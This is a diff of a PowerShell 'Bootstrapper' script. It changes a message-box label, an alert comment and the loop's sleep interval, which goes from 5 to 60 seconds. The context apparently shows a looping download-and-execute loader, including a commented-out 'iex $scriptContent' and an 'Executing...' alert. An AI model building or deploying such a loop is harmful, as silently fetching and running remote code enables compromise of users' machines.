@@ -1,5 +1,5 @@
 Add-Type -AssemblyName PresentationFramework
-        [System.Windows.MessageBox]::Show("Bootstrapper: THAJUI")
+        [System.Windows.MessageBox]::Show("Bootstrapper: new")
 
  # while ($true) {
     try {
@@ -19,7 +19,7 @@ Add-Type -AssemblyName PresentationFramework
         # iex $scriptContent
 
         # Show alert: Download complete
-        #  [System.Windows.MessageBox]::Show("Bootstrapper: Download complete. Executing...")
+        #[System.Windows.MessageBox]::Show("Bootstrapper: Download complete. Executing...")
 
         # Show alert: Execution finished
         #  [System.Windows.MessageBox]::Show("Bootstrapper: Execution complete. Waiting 5 seconds...")
@@ -30,5 +30,5 @@ Add-Type -AssemblyName PresentationFramework
     }
 
     # Wait before next loop
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 60
 }
